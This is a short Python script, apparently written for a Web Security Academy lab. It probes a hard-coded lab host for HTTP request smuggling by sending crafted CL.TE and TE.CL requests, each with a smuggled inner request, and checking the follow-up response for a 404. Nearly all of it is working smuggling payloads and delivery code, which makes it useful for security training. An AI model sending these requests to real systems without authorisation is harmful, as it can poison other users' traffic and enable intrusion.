import socket
import ssl

def send_request(host, request, port=80):
    # Crea un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conecta al host y puerto especificado
    s.connect((host, port))

    # Envía el request
    s.sendall(request.encode())

    # Recibe y muestra la respuesta
    response = s.recv(4096)
    
    # Cierra el socket
    s.close()

    return response.decode()

def send_request_with_ssl(host, request, port=443):
    # Crea un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Establece un tiempo de espera (timeout) para la función s.recv()
    s.settimeout(10)  # 10 segundos de timeout

    # Conexión SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    s = context.wrap_socket(s, server_hostname=host)

    try:
        # Conecta al host y puerto especificado
        s.connect((host, port))
        # Envía el request
        s.sendall(request.encode())
        # Recibe y muestra la respuesta
        response = s.recv(4096)
        # Cierra el socket
        s.close()
        return response.decode()
    except Exception as e:
        return f"Ocurrió un error: {e}"

def cl_te_detector(host):
    print("Probando CL.TE:")
    request = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 30\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /error HTTP/1.1\r
Foo: x\r
\r
'''
    first = send_request_with_ssl(host, request)
    print(first)
    second = send_request_with_ssl(host, request)
    
    if "404" in second:
        print("CL.TE detected!!")
    else:
        print("Not seem to be vulnerable to CL.TE")

def te_cl_detector(host):
    print("Probando TE.CL:")
    request = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
5e\r
POST /404 HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
'''
    first = send_request_with_ssl(host, request)
    second = send_request_with_ssl(host, request)
    
    if "404" in second:
        print("TE.CL detected!!")
    else:
        print("Not seem to be vulnerable to TE.CL")



if __name__ == '__main__':
    host = '0a4f0055034eb60781b7c6b500a50091.web-security-academy.net'
    cl_te_detector(host)
    te_cl_detector(host)
